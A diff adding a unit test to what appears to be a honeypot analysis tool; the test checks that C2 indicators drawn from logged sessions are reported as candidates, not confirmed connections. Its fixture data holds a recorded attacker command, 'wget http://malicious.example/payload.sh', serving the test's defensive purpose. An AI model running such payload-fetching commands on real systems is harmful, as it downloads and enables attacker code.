@@ -6,6 +6,7 @@ import json
 import random
 import subprocess
 import pathlib
+import sqlite3
 import shutil
 import struct
 import sys
@@ -38,6 +39,33 @@ def elf(machine=40, bits=32, little=True, interp=False):
     h[54:58] = struct.pack(e + "HH", 56, 1)
     ph = struct.pack(e + "II", 3 if interp else 1, 0) + b"\x00" * 48
     return bytes(h) + ph
+
+
+
+class C2Intelligence(unittest.TestCase):
+    def test_candidates_are_not_reported_as_confirmed_connections(self):
+        obj = ha.HoneyAnalysis.__new__(ha.HoneyAnalysis)
+        obj.lock = threading.Lock()
+        obj.db = sqlite3.connect(":memory:")
+        obj.db.execute("CREATE TABLE sessions (id TEXT, ip TEXT, start REAL, commands TEXT)")
+        obj.db.execute("CREATE TABLE samples (sha256 TEXT, first_seen REAL, last_seen REAL, analysis TEXT)")
+        now = time.time()
+        obj.db.execute("INSERT INTO sessions VALUES (?,?,?,?)",
+                       ("s-1", "198.51.100.9", now, json.dumps(["wget http://malicious.example/payload.sh"])))
+        obj.db.execute("INSERT INTO samples VALUES (?,?,?,?)",
+                       ("a" * 64, now, now, json.dumps({"iocs": {"ips": [{"value": "8.8.8.8"}],
+                                                                    "domains": [{"value": "c2.bad-domain.example"}],
+                                                                    "urls": []}})))
+        obj.db.commit()
+        result = obj.c2_intelligence(24)
+        values = {(x["kind"], x["value"]) for x in result["candidates"]}
+        self.assertIn(("url", "http://malicious.example/payload.sh"), values)
+        self.assertIn(("domain", "malicious.example"), values)
+        self.assertIn(("domain", "c2.bad-domain.example"), values)
+        self.assertNotIn(("ip", "8.8.8.8"), values)
+        self.assertEqual(result["confirmed_connections"], [])
+        self.assertEqual(result["confirmed_count"], 0)
+        self.assertTrue(all(x["confidence"] == "candidate" for x in result["candidates"]))
 
 
 class FileType(unittest.TestCase):
